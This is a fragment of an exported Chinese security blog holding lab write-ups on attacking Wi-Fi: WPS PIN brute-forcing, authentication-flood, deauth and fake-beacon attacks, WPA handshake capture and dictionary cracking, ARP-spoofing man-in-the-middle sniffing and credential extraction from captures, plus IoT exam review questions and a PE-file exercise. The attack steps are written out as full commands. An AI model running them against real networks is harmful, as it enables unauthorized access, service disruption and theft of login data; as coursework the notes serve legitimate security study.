PIN暴力破解中","categories":[{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"无线网络安全","slug":"实验/无线网络安全","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"入侵检测","slug":"入侵检测","permalink":"https://gryffinbit.top/tags/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"}],"author":"Gryffinbit"},{"title":"物联网期末考点","slug":"物联网期末考点","date":"2021-06-03T19:40:09.000Z","updated":"2024-11-12T06:59:59.000Z","comments":true,"path":"2021/06/04/物联网期末考点/","permalink":"https://gryffinbit.top/2021/06/04/%E7%89%A9%E8%81%94%E7%BD%91%E6%9C%9F%E6%9C%AB%E8%80%83%E7%82%B9/","excerpt":"","text":"实验部分WIFI密码破解之WPS加密 实验原理：WPS（Wi-Fi Protected Setup）是由Wi-Fi联盟组织实施的可选认证项目，主要是为了简化无线局域网安全及安全性能的配置工作。用户只需要简单按下路由器上的WPS按钮或者输入PIN码，即可快速连接到Wi-Fi网络。​ WPS PIN码共8位，其中第8位是校验和，所以只需计算出前7位即可。在实施PIN破解时，可以分别判断PIN的前四位和后三位是否正确。因此，PIN码只有10^4+10^3&#x3D;11000种变化。​ 那么在实际破解尝试中，最多只需试验11000次，平均只需试验5500次就能破解。 reaver 1. 开启无线网卡的监听模式 airmon-ng start wlan0 2.使用wash工具扫描开启WPS的AP wash -i wlan0mon BSSID AP 的MAC地址 Ch AP的工作信道 选项 说明 dBm 接收的信号强度 WPS WPS的版本 Lck WPS是否锁定 Vendor 生成厂商 ESSID AP的SSID ​ 查看有WPS功能的AP ​ airodump-ng --wps wlan0mon 3. 使用reaver工具进行破解 Reaver是一款暴力破解PIN码的工具，将尝试一系列的PIN码，直到破解出正确的PIN码，而且还可以恢复出WPA&#x2F;WPA2密码。其语法格式如下： reaver -i [interface] -b [ap的mac地址] 参数说明： 选项 说明 -i 指定监听的无线接口 -b 指定目标AP的mac地址 -S 使用最小的DH key，可以提高破解速度 -v ; -vv ; -q 显示非严重警告 ; 显示更多， 相对应的 ; 只显示关键信息 -d 即delay每穷举一次的闲置时间，预设为1秒 -c 信道号码 -p 使用指定PIN码的四位或八位开始破解。 ​ reaver -i wlan0mon -b 18:D9:8F:66:CD:7C -v -S ​ 使用指定PIN码进行破解，以“Netsec109_2”作为攻击目标 ​ reaver -i wlan0mon -b 64:09:80:17:ED:2F -p 1234 -vv -S wifite​ wifite是一款自动化WEP、WPA和 WPS破解工具。用于破解WPS加密的语法格式如下： 1wifite --wps --wps-only --bully 选项 说明 –wps 仅显示启用WPS功能的无线网络。 –wps-only 仅实施WPS PIN和Pixie-Dust攻击。 –bully 使用bully程序实施WPS PIN和Pixie-Dust攻击。 –ignore-locks 当AP锁定后，继续WPS PIN攻击。 1wifite --wps --wps-only --bully --ignore-locks 选择一个想要攻击的编号 BullyBully也是一款利用路由器的WPS漏洞来破解WIFI的工具。其语法格式如下： 1bully --bssid [AP的MAC地址] -c [channel] [interface] -vv 选项 说明 interface 指定监听的无线接口。 -b，–bssid 指定目标AP的MAC地址。 -c，–channel 指定目标AP工作的信道。 -vv 显示更详细的信息。 1bully --bssid 18:D9:8F:66:CD:7C wlan0mon -c 11 防止锁PIN​ 目前，大部分路由器都自带防PIN功能。当穷举PIN码暴力破解时，连续使用超过特定次数的PIN码后，路由器会暂时锁定WPS功能一段时间。这种情况，需要耐心等待其恢复WPS功能。也可以使用mdk3发起洪水攻击，使得路由器合法用户无法使用网络，从而迫使路由器主人重启路由器，即可解除PIN锁。​ AP认证洪水攻击，就是向AP发送大量虚假的连接请求。当发送的请求超过AP所能承受的范围时，AP就会自动断开现有连接，使得合法用户无法使用网络。其语法格式如下： 1mdk3 &lt;interface&gt; a &lt;test_options&gt; 选项 说明 interface 指定用于攻击的网络接口，需是监听模式的接口。 a 实施身份验证洪水攻击模式。 -a 指定要攻击的目标AP的MAC地址。 1mdk3 wlan0mon a -a 18:D9:8F:66:CD:7C 使用airodump-ng监测，可以看到界面下方瞬间出现了大量的伪造客户端，且连接的目标AP均为”18:D9:8F:66:CD:7C”。 1airodump-ng wlan0mon -c 11 --bssid 18:D9:8F:66:CD:7C WPA握手包破解原理​ 实验原理：WPA密码其实叫PSK（pre-shared key），它加上ssid通过一定的算法可以得到PMK（pairwise master key）: $$ PMK&#x3D;SHA_1(ssid,psk) $$​ PMK的长度是定长的，都是64字节。由于计算PMK的过程开销比较大，是我们破解花费时间长的关键，所以采用以空间换时间的原则把PMK事先生成好，这个事先生成好的表就是常说的HASH表，这个工作就是用airlib-ng这个工具来完成。​ 目前的破解方法是我们获得握手包后，用我们字典中的PSK+ssid生成PMK，然后结合握手包中的（客户端MAC，AP的BSSID，$A_NONCE$，$S_NONCE$）计算PTK，再加上原始的报文数据算出MIC并与AP发送的MIC比较，如果一致，那么该PSK就是密钥。 airolib-ng​ airolib-ng是Aircrack-ng套装里的又一个工具，用来存储和处理网络名和密码表。通过计算PMK，用于WPA&#x2F;WPA2的破解。其语法格式如下： 1airolib &lt;database&gt; &lt;operation&gt; [options] 选项 说明 database 表示数据库文件，可以是绝对路径。 operation 指定了我们要对数据库进行的操作。 –import {essid|passwd} {file} 导入含有网络名或者秘钥列表的文本文件。文件每行需含一个网络名或者密码，以换行符结束（这样读入时就会被当做“enter”）。 –batch 开始计算所有网络名和密码的组合。此命令需用在aircrack-ng破解之前。当数据库添加了新的SSID或者密码时，也许重新计算。 –export cowpatty [essid] [file] 导出为cowpatty文件。 –sql {sql} 执行所给的SQL语句。 airolib-ng –help 查看帮助文档。 1.创建包含ESSID的文档 创建包含ESSID的文档，每行含有一个ESSID。创建名称为gryffinbit（名称自取）的数据库，向数据库插入ESSID。 1airolib-ng gryffinbit --import essid /root/ssid.txt 2.创建包含密码的文档，并向rainbow数据库插入密码。 1airolib-ng gryffinbit --import password /root/password.txt 3.批量生产PMK数据。 1airolib-ng gryffinbit --batch 查看数据的状态 1airolib-ng gryffinbit --stats 可以看到，当前数据库中有11个ESSID和16个密码，并且已成功对其进行了计算。 4.使用aircrack-ng进行破解 1aircrack-ng -r gryffinbit -e helloworld handshake-01.cap 选项 说明 -r 指定PMK数据库 -e 指定ESSID ​ 也可以选择使用Cowpatty工具进行破解。Cowpatty是一款Linux下用于破解WPA-PSK加密的工具。其语法格式如下： 1cowpatty [options] 选项 说明 -d Hash表 -r 含有握手包的cap文件 -s AP的ESSID 在使用Cowpatty之前，需要先提取用于cowpatty跑的hash 表。 1airolib-ng gryffinbit --export cowpatty helloworld R_table 然后就可以使用Cowpatty工具。 1cowpatty -s kong -d R_table -r .cap ​ 使用airolib-ng生成PMK数据后，可以对该数据进行管理，比如导入第三方数据、校验数据和清理数据。导入ssidlist.txt 文件中的ESSID到数据库。 1airolib-ng gryffinbit --import password /root/password.txt 导入pword.txt 文件中的密码到数据库。 1airolib-ng gryffinbit --import essid /root/ssidlist.txt 使用–verify选项校验数据，以验证数据库的状态正常。也可以使用–clean选项进行数据清理。 1airolib-ng gryffinbit --verify 可以使用下面的命令行插入单个ESSID。插入单个密码也可类似操作。 1echo Love | airolib-ng gryffinbit --import essid - hashcat工具​ hashcat一款强大的开源密码恢复工具。该工具可以利用CPU或GPU资源，破解多种hash类型的密码。当捕获握手包以后，可以使用该工具快速的破解出WPA密码。使用hashcat工具破解WPA的语法格式如下： 1hashcat -m 2500 [pcap file ] [words] --force 选项 说明 -m 指定使用的hash类型,与WPA相关的hash如下图。 Words 指定要使用的字典。 –force 忽略警告信息。 hashcat –help 查看帮助文档。 1.使用aircrack-ng将捕获的握手包文件转换为hccapx格式。 1aircrack-ng test-01.cap -j hashcattest 2.使用hashcat工具进行破解。 1hashcat -m 2500 hashcattest.hccapx /root/password.txt --force 客户端行为分析 使用airdecap-ng永久解密WPA数据包airdecap-ng -e wlantest -p qwerty123 new-01.cap 用http.request==1进行过滤，获取客户端请求的网站和网页内容。从info列可以看到请求的网站内容。后缀名为.png、.jpeg的文件都为图片。复制请求的网址，即可查看到请求的完整图片。 比如复制上图中URI的值，得到详细网址http://cam.tju.edu.cn/uploads/image/20210422/20210422072727_84986.jpg 在浏览器即可查看图片内容。 用http.request.method==POST快速过滤出使用POST方式提交的数据包，获取客户端提交的登录信息。可以看到login，username，submit等信息。 通过DNS记录查看客户端使用的程序，使用dns过滤器，快速过滤出所有DNS协议包。可以看到所有DNS查询（query）和响应（query response）的包。通过查看info列的详细信息，可以看到客户端请求解析的域名。通过查看响应包的详细信息，即可知道服务器的IP地址。过滤后展示了域名为wsjf.cdut.edu.cn的服务器IP地址为202.115.140.178。 当用户使用QQ程序时，会捕获到大量的OICQ协议包。因此可以通过过滤器oicq，查看客户端是否运行了QQ程序。可以看到过滤了许多OICQ协议包，从包的详细信息可以看到数据包请求的命令、序列号、QQ号及是否有数据传输等信息。 httpry是一款HTTP数据包嗅探工具，可以提取HTTP。先使用命令apt-get install httpry安装，安装成功后，就可以提取HTTP访问记录httpry -r new-01-dec.cap可以看到提取到的所有HTTP访问记录。输出信息分为6个部分，分别是时间、源地址、目标地址、请求方法、主机名和包信息。 Ettercap是一款基于ARP地址欺骗方式的网络嗅探工具。该工具不仅可以在线监听网络数据包，还可以直接读取捕获文件中的数据包内容，以提取用户的相关信息，如登录用户名和密码等。 其语法格式如下：ettercap -Tq -r &lt;pcapfile&gt; 1-T:脱机嗅探。指定该选项后，Ettercap工具将监听一个pcap兼容文件中存储的网络数据包，而不是直接监听网络上的数据包。-q:安全模式，即不显示包内容。-r &lt;pcapfile&gt;:指定打开的捕获文件。 使用 Ettercap工具从 new-01-dec.cap中提取登录信息：ettercap -Tq -r new-01-dec,cap 可以看到登录网址202.115.133.172:80，用户名和密码。 ARP中间人攻击 实验原理：MITM，全称为Man In The Middle，即中间人。ARP地址解析协议是建立在网络中各个主机互相信任的基础上的，它的诞生使得网络能够更加高效的运行，但其本身也存在缺陷。ARP地址转换表是依赖于计算机中高速缓冲存储器动态更新的，而高速缓冲存储器的更新是受到更新周期的限制的，只保存最近使用的地址的映射关系表项，这使得攻击者有了可乘之机，可以在高速缓冲存储器更新表项之前修改地址转换表，实现攻击。 ARP请求为广播形式发送的，网络上的主机可以自主发送 ARP应答消息，并且当其他主机收到应答报文时不会检测该报文的真实性就将其记录在本地的MAC地址转换表，这样攻击者就可以向目标主机发送伪ARP应答报文，从而篡改本地的MAC地址表。 ARP欺骗可以导致目标计算机与网关通信失败，更会导致通信重定向，所有的数据都会通过攻击者的机器。攻击者再对目标和网关之间的数据进行转发，则可作为一个“中间人”，实现监听目标却又不影响目标正常上网的目的。 具体的中间人攻击，大体可以分为以下几个步骤： 对目标主机进行ARP欺骗，声称自己是网关。 转发目标的NAT数据到网关，维持目标的外出数据。 对网关进行ARP欺骗，声称自己是目标主机。 转发网关的NAT数据到目标主机，维持目标的接收数据。 监听劫持或者修改目标的进入和外出数据，从而实现攻击。其中1，3都是ARP欺骗；2，4都是转发。 查看网卡，确保wlan0已经连接到目标AP。 ifconfig 查看路由IP ip route show 在kali系统开启IPV4网络数据包转发功能。 sysctl -w net.ipv4.ip_forward=1 ARP欺骗 以Dsniff工具集的arpspoof命令为例 arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host 1-i 指定使用的接口。-c 指定当还原arp配置时t使用的MAC地址，默认为使用原来的MAC。（即当停止arpspoof命令后，默认取消毒化）-t 指定要毒化的主机，如果不指定的话默认为局域网下所有主机。-r 双向毒化（host和target），从而双向捕捉数据。（仅当同时指定 -t的时候才有效） host 通常是本地网关。所有从target到host的数据包都被重定向到本机。 使用arpspoof -i wlan0 -t 192.168.3.173 192.168.3.1 进行ARP欺骗，将靶机192.168.3.173发送给192.168.3.1的数据包先发送给kali主机，再由主机转发。 使用arpspoof -i wlan0 -t 192.168.3.1 192.168.3.173截获来自路由器的数据包。将路由器发给靶机192.168.3.173的数据包先发送给kali主机，再由本机转发。 输入driftnet -i wlan0进行监控，会弹出一个监控框，在靶机上浏览网页，就会显示出靶机浏览的图片。只能嗅探到没有加密的图片。 输入urlsnarf -i wlan0嗅探靶机访问的网址。 结束攻击，关闭数据包路由功能sysctl -w net.ipv4.ip_forward=0 还可以使用其他网络活动监视工具，比如filesnarf、mailsnarf、 msgsnarf、 webspy 和 sshow等，使用方式和urlsnarf差不多。也可以通过使用Ettercap来进行ARP欺骗。Ettercap是一个多用途的开源工具，可以用来执行嗅探、主机分析等。输入ettercap -G就可进入图形化操作界面，请大家自行尝试。 课后题部分检索目录(物联网安全导论第一版【李联宁编著】)简述物联网的安全特征 P4 物联网从功能上来说具备哪几个特征？ P5 按照科学、严谨的表述，物联网结构应分为哪几层？ P5 简述物联网中的业务认证机制。 Ｐ11 物联网中的加密机制是什么？ Ｐ12 感知识别层可能遇到的安全挑战包括哪几种情况？ Ｐ14 物联网中的加密机制实施时的主要困难是什么？ Ｐ30 物联网密钥管理系统面临哪两个主要问题？ P 31 物联网的数据要经过哪几层处理流程？ Ｐ33 什么是安全路由协议？按路由算法的实现方法划分，通常有哪几种路由？ P 33～34 传感器网络可能受到哪几种攻击？ 对应的解决方案是什么？ Ｐ34 无线传感器网络中的认证技术有哪几种？ P 35 古典密码学主要分成哪几种类型？请详述其中一种。 Ｐ41 基于零知识证明的识别技术原理是什么？ Ｐ72 物联网密钥管理流程有哪些步骤？ Ｐ74～76 依据标签的能量来源可以将标签分为哪几大类？ Ｐ 84 RFID 攻击模式有哪几种？ Ｐ86 简要说明RFID 系统的通信模型。 Ｐ87 安全RFID 系统的基本特征是什么 ？ Ｐ89 ～ 90 EPC 系统安全问题主要有哪几大类 ？ Ｐ 93 请进行EPC global系统的纵向安全和隐私威胁分析。 Ｐ94 针对RFID EPC标签的个人隐私威胁有哪些？ Ｐ95 如何采用密码机制解决RFID的安全问题？举两三个例子对RFID安全协议进行说明。 Ｐ97 无线传感器网络与安全相关的特点有哪些？ Ｐ105 简单分析无线传感器网络的安全威胁。 Ｐ106 无线传感器网络的攻击形式有哪几种？ Ｐ 108～109 如何采用安全路由来增加网络的安全性？有哪些常用的方式？ Ｐ112 简述涉及无线传感器网络的4种安全技术 Ｐ113～114 简要说明ZigBee技术在安全方面的具体特点。 Ｐ118～119 什么是ZigBee信任中心？它能提供哪几种功能？ Ｐ122 为了满足安全性需求。ZigBee标准使用哪几种方法来确保安全？ Ｐ123 简要解释物联网网络构建层的安全分类？ Ｐ127 如何保证无线网络的安全连接？ Ｐ127～128 无线通信网络中的不安全因素主要有哪几个方面？ Ｐ129～ 131 简述WAP应用面临的安全威胁。 Ｐ 132 为了应对这些安全漏洞，目前已经提出的端到端的安全模型主要有哪几种？ Ｐ134 蓝牙服务的安全主要由哪几方面来保证？ Ｐ145 感知终端目前存在的主要问题是什么？ Ｐ156 进行操作系统、数据库管理系统和中间件的类比。 P212 按网络功能子系统细分，有哪几类网络中间件？ Ｐ213 简述云计算逻辑结构。 Ｐ 218～219 云计算的主要服务形式有哪几种？ Ｐ222 云安全主要包含哪两个方面的含义？ Ｐ225 要想建立云安全系统，并使之正常运行，需要解决哪4个方面的问题？ Ｐ226 简要说明云计算平台的安全与划分的基本原则。 Ｐ253 简单描述信息隐藏和密码技术的区别。 Ｐ272 信息加密和隐藏可以分为哪3种模式？ Ｐ273 信息隐藏技术主要由哪两部分组成？ Ｐ276 简要说明信息隐藏系统的特征。 Ｐ276 信息隐藏的主要方法有哪几种 ？ Ｐ277 什么是隐藏匿名通信技术？ Ｐ279 数据隐写术可以分成哪几类？ Ｐ280 隐蔽信道的定义是什么？ Ｐ285 通用的数字水印算法包含哪两个基本方面？ Ｐ297 名词解释IOT (Internet of Things) 物联网 DES (Data Encryption Standard) 数据加密标准 AES (Advanced Encryption Standard) 高级加密标准 ZKP (Zero Knowledge Proof) 零知识证明 MDP (Minimum Disclosure Proof) 最小泄露证明 RFID (Radio Frequency IDentification) 无线射频识别 PKI (Public Key Infrastructure) 公开密钥基础设施","categories":[{"name":"期末考试","slug":"期末考试","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/"},{"name":"物联网","slug":"期末考试/物联网","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E7%89%A9%E8%81%94%E7%BD%91/"}],"tags":[{"name":"考点","slug":"考点","permalink":"https://gryffinbit.top/tags/%E8%80%83%E7%82%B9/"}],"author":"Gryffinbit"},{"title":"手工打造PE文件","slug":"手工打造PE文件","date":"2021-05-28T09:14:50.000Z","updated":"2024-11-12T07:00:05.000Z","comments":true,"path":"2021/05/28/手工打造PE文件/","permalink":"https://gryffinbit.top/2021/05/28/%E6%89%8B%E5%B7%A5%E6%89%93%E9%80%A0PE%E6%96%87%E4%BB%B6/","excerpt":"","text":"参考教材https://gryffinbit.lanzoui.com/imk3fpk3pfi 实验目的通过利用C32asm，手工编写一个Win32平台下的PE文件，进一步熟练掌握PE文件的结构。 实验内容参考教材P119-132，手工打造一个PE文件，该文件执行后输出如下内容： 实验结果1. 构造IMAGE_DOS_HEADER结构该结构体的大小为 40h 字节(十进制的64 字节) 。打开 hex 编辑器，填入64 个字节的0，然后根据IMAGE_DOS_HEADER的结构进行修改， 2. 构造PE标识符在构造完 DOS 头后,紧跟着构造 PE 标识符,PE 标识符占 4 个字节,因此hex中增加 4 个字节的数据，PE 标识符对应的十六进制数据为 “50 45 00 00” 3. 构造 IMAGE_FILE_HEADER 结构该结构体的大小为 14h 字节(十进制的 20 字节) ,同样hex中插入 20 个字节的全 0 数据,然后进行数据的修改填充。 4. 构造 IMAGE_OPTIONAL_HEADER 结构该结构体的大小为 0E0h 字节(十进制的 224 字节) ,在 hex 中填充 224 字节的全 0 数据,然后按照表 5-3 所列进行填充，最终填充结果 5. 构造 IMAGE_SECTION_HEADER 结构IMAGE_SECTION_HEADER 结构体的大小是 40 字节, 由于需要构造 3 个节表项, 因此节表大小占 120 字节。节表的填充如表 5-4 所列。最终填充结果 6. 0 数据的填充由于需要按照 0x00001000 的长度来进行对齐,因此用 0x1000−0x01B0&#x3D;0x0E50,即十进制数的 3664。在 hex 中插入“3664”个 0 字符将 PE 文件头按照 IMAGE_OPTIONAL_ HEADER 的 SizeOfHeader 进行对齐。在插入 3664 个 0 字符后,文件的结束偏移地址是0x00000FFF。在填充完 PE 文件头部后,需要继续填充 0x00001000 字节的 0 字符,该 0x00001000 字节的数据用来存放.text 节的内容,即代码节的内容。继续使用 C32Asm 插入 4096 个 0 字符。由于代码节是最后完成的部分,因此这里只是先对其填充 0 字符。 7. 填充.data 节的数据 注意比特数要保持一致 8. 填充.idata 节的数据最终填充数据 使用LordPE检查 9. 填充.text 节的数据OD打开后 通过 Ctrl+G 快捷键来到地址 0x00403000 处,查看导入表的信息 填写反汇编代码 最终结果","categories":[{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"逆向","slug":"实验/逆向","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E9%80%86%E5%90%91/"}],"tags":[{"name":"PE","slug":"PE","permalink":"https://gryffinbit.top/tags/PE/"}],"author":"Gryffinbit"},{"title":"攻击无线AP","slug":"攻击无线AP","date":"2021-05-21T16:45:44.000Z","updated":"2024-11-12T07:00:16.000Z","comments":true,"path":"2021/05/22/攻击无线AP/","permalink":"https://gryffinbit.top/2021/05/22/%E6%94%BB%E5%87%BB%E6%97%A0%E7%BA%BFAP/","excerpt":"","text":"实验目的掌握认证洪水攻击、Deauth攻击和假信标洪水攻击的原理。利用mdk4工具能够实现相应的攻击方法。能够利用wireshark工具区分认证（Authentication）数据包、取消认证（Deauthentication）数据包和信标帧（beacon frame）。 实验环境Kali操作系统及相关工具无线网卡无线AP 实验原理认证洪水攻击AP认证洪水攻击，就是向AP发送大量虚假的连接请求。当发送的请求超过AP所能承受的范围时，AP就会自动断开现有连接，使得合法用户无法使用网络。 Deauth攻击取消认证洪水攻击De-authentication Flood Attack简称Deauth攻击。该攻击方式主要是通过伪造AP向客户端单播地址发送取消身份验证帧，将客户端转为未关联&#x2F;未认证的状态。 假信标洪水攻击假信标攻击类似于伪AP，就是向无线信道中发送大量虚假的SSID来充斥客户端的无线列表，通过创建恶意无线热点，占用信道资源，干扰通讯。 实验过程认证洪水攻击 认证洪水攻击具体工作流程：1.确定当前无线网络中，客户端与AP已经建立了连接。一般情况下，所有无线客户端的连接请求都会被AP记录在连接表中。2.攻击者使用一些看起来合法但其实是随机生成的MAC地址来伪造STA。然后，攻击者就可以发送大量的虚假连接请求到AP。3.攻击者对AP进行持续且大量的虚假连接请求，最终导致AP失去响应，使得AP的连接列表出现错误。4.由于AP的连接表出现错误，使得连接的合法客户端强制与AP断开连接。 其语法格式如下： 1mdk4 &lt;interface&gt; a &lt;test_options&gt; interface:指定用于攻击的网络接口，需是监听模式的接口。 1234a: 实施身份验证洪水攻击模式。-a: 指定要攻击的目标AP的MAC地址。-m：使用有效数据库中的客户端MAC地址。-s：设置包的速率，默认无限制。 1mdk4 wlan0mon a -a 78:A3:51:15:67:C6 -m 使用airodump-ng监测，可以看到界面下方瞬间出现了大量的伪造客户端，且连接的目标AP均为”(攻击的Mac)”。 1airodump-ng wlan0mon --bssid 78:A3:51:15:67:C6 -c 11 如果攻击不成功，在打开监听模式时，就选择AP所在的信道进行监听。 Deauth攻击Deauth攻击流程：1.确定当前无线网络中客户端与AP已经建立了连接。2.攻击者向整个网络发送伪造的取消身份认证报文，从而阻断合法用户和AP间的连接。3.当客户端收到攻击者发送的报文时，会认为该报文来自AP。此时，客户端将试图与AP重新建立连接。4.攻击者仍然继续向信道中发送取消身份认证帧，将导致客户端与AP始终无法重连，即已连接的客户端自行断开连接。 使用mdk4实施Deauth攻击的语法格式如下： 1mdk4 &lt;interface&gt; d &lt;test_options&gt; interface:指定用于攻击的网络接口，需是监听模式的接口。 1234d: 实施Deauth攻击攻击模式。-s：设置包的速率，默认无限制。-c：指定攻击的信道，默认将在所有信道之间跳转，每3秒切换一次。-E:攻击指定ESSID的AP。 -B：攻击指定BSSID的AP。 将无线网卡设置为监听模式。用mdk4实施Deauth攻击，执行下面的命令后，将会输出以下信息。 1mdk4 wlan0mon d -s 120 -c 11 可以使用Wireshark捕获数据包，将会发现大量的解除认证无线数据包。连接相关信道的客户端都会连接中断。 假信标洪水攻击使用mdk4工具实施假信标洪水攻击的语法格式如下： 1mdk4 &lt;interface&gt; b &lt;test_options&gt; interface:指定用于攻击的网络接口，需是监听模式的接口。 12345678b: 实施假信标洪水攻击模式。-n：自定义ESSID。-f：读取ESSID列表文件。-w：选择假网络应具有的加密类型，有效选项：n=不加密，w=WEP， t=TKIP（WPA），a=AES（WPA2）。-t： 1=仅创建自组织网络 ，0=仅创建Managed（AP）网络。-m：读取数据库的MAC地址。-s：设置包的速率，默认为50。-c：自定义信道。 执行下述命令后，客户端可以探测一个ESSID为“测试WIFI”、处于Managed模式、信道为6、加密方式为WEP的假AP。 1mdk4 wlan0mon b -n 测试WIFI -t 0 -w w -c 6 -s 80 1mdk4 wlan0mon b -w a -m -c 6 执行上述命令后，用Wireshark捕获数据包，将捕获大量的Beacon信号帧。这些数据包中广播的SSID都是随机产生的。 创建一个名为ssid.txt的文件，用来保存如下四个ssid 用-f选项指定了该列表文件，执行上述命令后，客户端可以探测到假AP。 1mdk4 wlan0mon b -f /root/ssid.txt -w a -c 6 -s 100 -m 用Wireshark捕获数据包，将捕获大量的Beacon信号帧。这些数据包中广播的SSID都是ssid.txt产生的。","categories":[{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"无线网络安全","slug":"实验/无线网络安全","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[],"author":"Gryffinbit"},{"title":"WPA-PSK/WPA2-PSK工作原理","slug":"WPA-PSK-WPA2-PSK工作原理","date":"2021-05-21T16:45:08.000Z","updated":"2024-11-12T06:58:42.000Z","comments":true,"path":"2021/05/22/WPA-PSK-WPA2-PSK工作原理/","permalink":"https://gryffinbit.top/2021/05/22/WPA-PSK-WPA2-PSK%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/","excerpt":"","text":"实验目的掌握WPA-PSK&#x2F;WPA2-PSK工作原理。利用wireshark过滤器分析整个流程，特别是四次握手的过程。熟悉捕获四次握手中哪些Message之后才能进行PSK破解。 实验环境Kali操作系统及相关工具无线网卡无线AP 实验原理WPA-PSK连接过程： Open System Authentication (Request initiate by client) Open system Authentication (Response by AP) Association Request (sent by client) Association Response (send by AP) 4-Way Handshake – EAPoL Key Exchange Message 1 4-Way Handshake – EAPoL Key Exchange Message 2 4-Way Handshake – EAPoL Key Exchange Message 3 4-Way Handshake – EAPoL Key Exchange Message 4 DHCP Discover (send by client to L2 broadcast) DHCP Offer (send by DHCP server) DHCP Reqeust (send by client to L2 broadcast) DHCP ACK (send by DHCP server to client) 实验过程请自行针对某WPA-PSK的AP进行抓包，并用客户端连接AP，然后用过滤器语法分析整个PSK连接过程。 1，打开无线网卡监听模式。 1airmon-ng start wlan0 2，用airodump-ng抓包，找到目标AP。 1airodump-ng wlan0mon 3，针对某个AP进行抓包，并保存。 1airodump-ng wlan0mon -c 11 --bssid 78:A3:51:15:67:C6 -w handshake 4，用客户端连接AP。5，发起多次DEAUTH攻击，抓四次握手包。 1aireplay-ng -0 10 -a 78:A3:51:15:67:C6 -c 0E:7F:6D:E0:E0:F5 wlan0mon 78:A3:51:15:67:C6 是要攻击的Wi-Fi的bssid 0E:7F:6D:E0:E0:F5 是已经连接的设备的bssid 6，用wireshark过滤器分析信标帧Beacons、认证Authentication、连接请求Association Request 、 连接回应Association Response 、四次握手和获取DHCP的过程。 比如：四次握手中每条Message含有随机数的情况以及报文中是否有MIC值。进一步的，请思考是否只有捕获完整的四次握手才能进行PSK破解？ 用wlan.fc.type_subtype&#x3D;&#x3D;0X0B显示过滤捕获文件中所有的身份认证数据包。AUTH认证类型有两种，0表示开放式，1表示共享式。WPA&#x2F;WPA2是开放式认证。 用wlan.fc.type_subtype&#x3D;&#x3D;0X08进行过滤，只显示Beacons帧。 可以查看ESSID和BSSID和工作的信道。 同时，在信标帧也可查看AP使用的加密方式。使用WPA加密的AP，在捕获包中即可看到WPA Information Element信息。如果使用 WEP加密，将不会出现WPA Information Element信息。同时可以看到AP具有WPS功能，并且启用了WPS功能（configured） 用wlan.fc.type_subtype&#x3D;&#x3D;0X00过滤关联请求，可以找出与客户端连接的AP 。 如图，可以看到AP的MAC地址、客户端的MAC地址和AP的ESSID。 输入eapol可以过滤握手包。 注：并不需要解密就能查看DHCP ACK数据包中的相关信息。 ​ 实验原理：WPA密码其实叫PSK（pre-shared key），它加上ssid通过一定的算法可以得到PMK（pairwise master key）: ​ $$ PMK&#x3D;SHA_1(ssid,psk) $$​ PMK的长度是定长的，都是64字节。由于计算PMK的过程开销比较大，是我们破解花费时间长的关键，所以采用以空间换时间的原则把PMK事先生成好，这个事先生成好的表就是常说的HASH表，这个工作就是用airlib-ng这个工具来完成。​ 目前的破解方法是我们获得握手包后，用我们字典中的PSK+ssid生成PMK，然后结合握手包中的（客户端MAC，AP的BSSID，$A_NONCE$，$S_NONCE$）计算PTK，再加上原始的报文数据算出MIC并与AP发送的MIC比较，如果一致，那么该PSK就是密钥。 airolib-ng​ airolib-ng是Aircrack-ng套装里的又一个工具，用来存储和处理网络名和密码表。通过计算PMK，用于WPA&#x2F;WPA2的破解。其语法格式如下： 1airolib &lt;database&gt; &lt;operation&gt; [options] 选项 说明 database 表示数据库文件，可以是绝对路径。 operation 指定了我们要对数据库进行的操作。 –import {essid|passwd} {file} 导入含有网络名或者秘钥列表的文本文件。文件每行需含一个网络名或者密码，以换行符结束（这样读入时就会被当做“enter”）。 –batch 开始计算所有网络名和密码的组合。此命令需用在aircrack-ng破解之前。当数据库添加了新的SSID或者密码时，也许重新计算。 –export cowpatty [essid] [file] 导出为cowpatty文件。 –sql {sql} 执行所给的SQL语句。 airolib-ng –help 查看帮助文档。 1.创建包含ESSID的文档 创建包含ESSID的文档，每行含有一个ESSID。创建名称为gryffinbit（名称自取）的数据库，向数据库插入ESSID。 1airolib-ng gryffinbit --import essid /root/ssid.txt 2.创建包含密码的文档，并向rainbow数据库插入密码。 1airolib-ng gryffinbit --import password /root/password.txt 3.批量生产PMK数据。 1airolib-ng gryffinbit --batch 查看数据的状态 1airolib-ng gryffinbit --stats 可以看到，当前数据库中有11个ESSID和16个密码，并且已成功对其进行了计算。 4.使用aircrack-ng进行破解 1aircrack-ng -r gryffinbit -e helloworld handshake-01.cap 选项 说明 -r 指定PMK数据库 -e 指定ESSID ​ 也可以选择使用Cowpatty工具进行破解。Cowpatty是一款Linux下用于破解WPA-PSK加密的工具。其语法格式如下： 1cowpatty [options] 选项 说明 -d Hash表 -r 含有握手包的cap文件 -s AP的ESSID 在使用Cowpatty之前，需要先提取用于cowpatty跑的hash 表。 1airolib-ng gryffinbit --export cowpatty helloworld R_table 然后就可以使用Cowpatty工具。 1cowpatty -s kong -d R_table -r .cap ​ ​ 使用airolib-ng生成PMK数据后，可以对该数据进行管理，比如导入第三方数据、校验数据和清理数据。导入ssidlist.txt 文件中的ESSID到数据库。 1airolib-ng gryffinbit --import password /root/password.txt 导入pword.txt 文件中的密码到数据库。 1airolib-ng gryffinbit --import essid /root/ssidlist.txt 